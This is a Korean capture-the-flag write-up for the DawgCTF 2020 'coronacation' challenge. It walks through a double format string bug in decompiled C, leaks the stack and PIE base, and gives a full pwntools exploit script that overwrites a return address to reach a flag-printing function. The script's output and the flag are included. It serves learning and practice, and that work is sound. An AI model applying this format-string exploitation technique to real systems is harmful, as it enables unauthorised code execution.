# [WriteUp]DawgCTF 2020 - coronacation

:black_nib:N1be(sj.dr.nibe@gmail.com)

---

## Overview

### play_game()

```c
int play_game()
{
  int result; // eax
  char s[64]; // [rsp+0h] [rbp-40h]

  puts("Welcome to this choose your own adventure game!");
  puts("You're President Ronald Drump and are tasked with leading the nation through this crisis.");
  puts("So what do you want to do?");
  puts("1. Close the borders.");
  puts("2. Tell everyone not to panic. It's just the Fake News media freaking out.");
  fgets(s, 50, _bss_start);
  printf("You chose: ");
  printf(s);
  if ( s[0] == '1' )
    return close_borders();
  result = '2' - (unsigned __int8)s[0];
  if ( s[0] == '2' )
    result = no_panic();
  return result;
}
```

도날드 트럼프 대통령이 되어 코로나19 사태를 극복하기 위해 선택을 해야 한다. 사실 무슨 선택을 하는지는 별로 중요하지 않고, 선택한 번호를 출력할 때 `printf(s);`로 출력해서 format string bug(FSB)가 발생한다는 사실이 중요하다.

### close_borders()

```c
int close_borders()
{
  int result; // eax
  char s[64]; // [rsp+0h] [rbp-40h]

  puts("\nSo we closed our borders. Weren't we doing that anyway with the wall?");
  puts("It's still spreading within our borders what do we do now?");
  puts("1. Reassure everyone the country can handle this. Our healthcare system is the best. Just the greatest.");
  puts("2. Make it a national emergency. Show the people we don't need Bernie's healthcare plan.");
  fgets(s, 50, _bss_start);
  printf("You chose: ");
  printf(s);
  if ( s[0] == '1' )
    return lose3();
  result = '2' - (unsigned __int8)s[0];
  if ( s[0] == '2' )
    result = lose4();
  return result;
}
```

`close_borders()`와 `no_panic()`은 똑같이 생겼고, 나라가 망했을 때 나오는 메시지만 다르다. 여기서도 선택한 메뉴를 `printf(s);`로 출력하고 있다. `play_game()`과 연결되어 double stage FSB가 발생한다.

### win()

```c
int win()
{
  char *argv; // [rsp+0h] [rbp-20h]
  const char *v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]

  printf("I'm not sure how, but your terrible leadership worked!");
  argv = "/bin/cat";
  v2 = "flag.txt";
  v3 = 0LL;
  return execve("/bin/cat", &argv, 0LL);
}
```

플래그를 주는 함수이다.

### Mitigation

```shell
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

PIE가 걸려 있는데, 이건 그냥 FSB를 이용해서 leak을 하면 PIE base를 알 수 있기 때문에 별로 의미가 없다.

---

## Exploit plan

### leak

stage 1에서 스택의 주소와 PIE base를 모두 leak할 수 있다.

```shell
gdb-peda$ r
Starting program: /home/dr-nibe/DawgCTF2020/coronacation 
Welcome to this choose your own adventure game!
You're President Ronald Drump and are tasked with leading the nation through this crisis.
So what do you want to do?
1. Close the borders.
2. Tell everyone not to panic. It's just the Fake News media freaking out.
1 %14$p %15$p
You chose: 1 0x7fffffffdfa0 0x555555555484
```

14번째 format string에서는 `play_game()`의 return address보다 8만큼 큰 값이 나오고, 15번째 format string에서는 PIE base + `0x1484`가 나온다.

### overwrite return address

stage 2에서, 스택에 return address의 주소를 적어 놓고, `%n`을 사용해서 overwrite를 할 수 있다. PIE base를 알기 때문에 `win()`의 주소를 구해서 사용하면 될 것 같다. `win()`의 주소는 PIE base + `0x1165`이다. 어차피 `play_game()`의 return address와 `win()`의 주소는 별로 차이가 없기 때문에 하위 2바이트만 덮어도 될 것 같다.

---

## Exploit

```python
# exploit_coronacation

from pwn import *

# r = process("./coronacation")
r = remote("ctf.umbccd.io", 4300)

r.recvuntil("It's just the Fake News media freaking out.\n")

payload = "1"
payload += " %14$p %15$p"
r.sendline(payload)

r.recvuntil("You chose: 1 0x")
stack = int(r.recvuntil(" ")[:-1], 16) - 8 # address where play_game()'s return address is on
pie = int(r.recvline()[:-1], 16) - 0x1484 # PIE base
win = pie + 0x1165 # address of win()

log.info("stack: " + hex(stack))
log.info("PIE base: " + hex(pie))

r.recvuntil("Show the people we don't need Bernie's healthcare plan.\n")

win_low = win & 0xffff

payload = "1"
payload += "%" + str(win_low - 1) + "c%8$hn"
payload = payload.ljust(0x10, "A")
payload += p64(stack)

r.sendline(payload)

r.interactive()
```

```shell
dr-nibe@ubuntu:~/DawgCTF2020$ python exploit_coronacation.py 
[+] Opening connection to ctf.umbccd.io on port 4300: Done
[*] stack: 0x7ffef526c5b8
[*] PIE base: 0x5556be143000
[*] Switching to interactive mode
You chose: 1
...
Hospitals become overrun with cases and many people without healthcare can't afford treatment
Society collapses as hospitals fill.
DawgCTF{st@y_Th3_f@ck_h0m3}
[*] Got EOF while reading in interactive
$  
```

